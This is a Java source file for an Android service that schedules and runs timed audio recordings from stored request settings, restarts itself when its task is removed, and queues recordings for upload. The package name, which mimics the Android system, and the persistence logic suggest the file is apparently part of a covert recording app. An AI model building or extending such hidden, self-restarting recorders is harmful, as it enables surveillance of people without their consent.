package com.android.network.detect;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

public class DetectorService extends Service {

    private String LOG_TAG = AppGlobals.getLogTag(getClass());
    RecorderHelpers mRecorderHelpers;
    static int recordTime;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (AppGlobals.getLastRecordingFilePath() != null && intent == null) {
            RecordingDatabaseHelper helpers = new RecordingDatabaseHelper(getApplicationContext());
            helpers.createNewEntry(SqliteHelpers.COULMN_UPLOAD, AppGlobals.getLastRecordingFilePath());
            AppGlobals.saveLastRecordingFilePath(null);
        }

        if (intent == null) {
            Log.v(LOG_TAG, "Service respawned");
        } else {
            Log.v(LOG_TAG, "Service started");
        }
        mRecorderHelpers = new RecorderHelpers(getApplicationContext());
        mRecorderHelpers.createRecordingDirectoryIfNotAlreadyCreated();
        readSettingsAndStartRecording();

        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        Intent intent = new Intent(getApplicationContext(), DetectorService.class);
        startService(intent);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void readSettingsAndStartRecording() {
        long requestTime = AppGlobals.getLastRecordingRequestEventTime();
        int delay = AppGlobals.getLastRecordingRequestGapDuration();
        int recordInterval = AppGlobals.getLastRecordingRequestRecordIntervalDuration();
        recordTime = AppGlobals.getLastRecordingRequestDuration();

        if (System.currentTimeMillis() >= requestTime + recordTime) {
            /* Don't do anything as the time has passed, probably because the
            device was turned off. Stop the service. */
            stopSelf();
        }

        int totalRemainingTime;
        if (delay == 0 && recordInterval == 0) {
            totalRemainingTime = (int) ((requestTime - System.currentTimeMillis()) + recordTime);
            if (totalRemainingTime > 0) {
                mRecorderHelpers.startRecording(totalRemainingTime, 0);
            }
        } else if (delay > 0 && recordInterval > 0) {
            int potentialRecordingSpan = getCalculatedTime(recordTime, delay, recordInterval);
            Log.v(LOG_TAG, String.format("Potential %d", potentialRecordingSpan));
            Log.v(LOG_TAG, String.format("Recording time %d", recordTime));
            float recordTimePercentageInTotalSpan = ((float) recordTime / (float) potentialRecordingSpan) * 100;
            Log.v(LOG_TAG, String.format("Record time percentage %f", recordTimePercentageInTotalSpan));
            // Calculate how much percentage time is left for the given recording request.
            int timeSinceRequest = (int) (System.currentTimeMillis() - requestTime);
            Log.v(LOG_TAG, String.format("Time since request %d", timeSinceRequest));
            int realRemainingTime = potentialRecordingSpan - timeSinceRequest;
            Log.v(LOG_TAG, String.format("Remaining time %d", realRemainingTime));
            if (realRemainingTime > 0) {
                int timeToRecord = (int) (recordTimePercentageInTotalSpan * realRemainingTime) / 100;
                Log.v(LOG_TAG, String.format("Delay %d", delay));
                Log.v(LOG_TAG, String.format("Interval repeats %d", recordInterval));
                Log.v(LOG_TAG, String.format("Record time %d", timeToRecord));
                mRecorderHelpers.startRecording(timeToRecord, delay, recordInterval);
            }
        }
    }

    private int getCalculatedTime(int recordTime, int gapInterval, int recordInterval) {
        float parts = (float) recordTime / (float) recordInterval;
        int completeParts = (int) parts;
        float partial = parts - completeParts;

        int totalIntervals = completeParts - 1;
        if (partial > 0) {
            totalIntervals += 1;
        }

        return recordTime + (gapInterval * totalIntervals);

    }
}
